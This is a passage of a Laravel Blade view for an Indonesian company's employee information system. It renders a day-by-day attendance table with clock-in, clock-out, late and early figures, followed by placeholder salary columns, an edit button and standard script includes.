                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 30 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 31 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach</td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 1 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 2 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 3 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach</td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 4 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 5 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach</td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 6 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach</td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 7 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 8 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 9 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 10 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 11 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 12 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 13 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 14 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach</td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 15 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach</td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 16 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 17 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach</td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 18 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 19 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 20 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        hahahaha
                                    </td>
                                    <td>Rp 3,000,000</td>
                                    <td>Rp 12,000,000</td>
                                    <td>Rp 225,000</td>
                                    <td>Rp 12,400,000</td>
                                    <td>BRI</td>
                                    <td>
                                        <a href="/datakaryawan/{{$data->nik}}/edit/data_pribadi"><button type="button" class="btn btn-space btn-warning"> Edit </button></a>
                                    </td>
                                </tr>
                            @endforeach
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!--   Content End  -->

<!--Footer -->

<div class="text-center">
    <div class="credits">
        <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
    </div>
</div>

<!-- Script Toastr untuk notifikasi-->
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

<script>
        @if (Session::has('message'))
    var type = "{{Session::get('alert-type','info')}}";
    toastr.options = {
        "debug": false,
        "onclick": null,
        "fadeIn": 300,
        "fadeOut": 1000,
        "timeOut": 5000,
        "extendedTimeOut": 1000
    }

    switch(type)
    {
        case 'info':
            toastr.info("{{Session::get('message')}}");
            break;

        case 'success':
            toastr.success("{{Session::get('message')}}");
            break;

        case 'warning':
            toastr.warning("{{Session::get('message')}}");
            break;

        case 'error':
            toastr.error("{{Session::get('message')}}");
            break;
    }

    @endif

</script>

<!--  Inisialisasi Java Script -->

<script src="/assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
<script src="/assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<script src="/assets/js/main.js" type="text/javascript"></script>
<script src="/assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
